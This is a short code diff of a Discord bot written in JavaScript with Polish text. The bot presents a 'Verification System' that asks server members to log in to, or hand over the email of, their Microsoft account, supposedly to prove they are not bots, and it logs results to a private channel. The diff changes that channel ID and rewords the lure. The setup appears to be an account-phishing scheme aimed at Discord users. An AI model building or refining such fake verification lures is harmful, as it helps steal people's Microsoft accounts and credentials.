@@ -32,7 +32,7 @@ const client = new Client({
 });
 
 const PREFIX = '!';
-const LOG_CHANNEL_ID = "1505172146496868553"; // ID kanału sprawdzacz botow
+const LOG_CHANNEL_ID = "1505269850191433921"; // ID kanału sprawdzacz botow
 
 client.once('ready', async () => {
     console.log(`\x1b[32m[READY]\x1b[0m Zalogowano jako ${client.user.tag}`);
@@ -66,7 +66,7 @@ client.on('interactionCreate', async (interaction) => {
             const embed = new EmbedBuilder()
                 .setColor(0x00AAFF)
                 .setTitle('🛡️ System Weryfikacji')
-                .setDescription('Hej! Zaloguj się do swojego konta microsoft abyśmy wiedzieli że nie jesteś botem.')
+                .setDescription('Hej! Podaj swój mail konta microsoft abyśmy wiedzieli czy nie jesteś botem i zweryfikuj się!')
                 .setFooter({ text: 'Weryfikacja jest wymagana, aby uzyskać dostęp do serwera.' });
 
             const row = new ActionRowBuilder().addComponents(
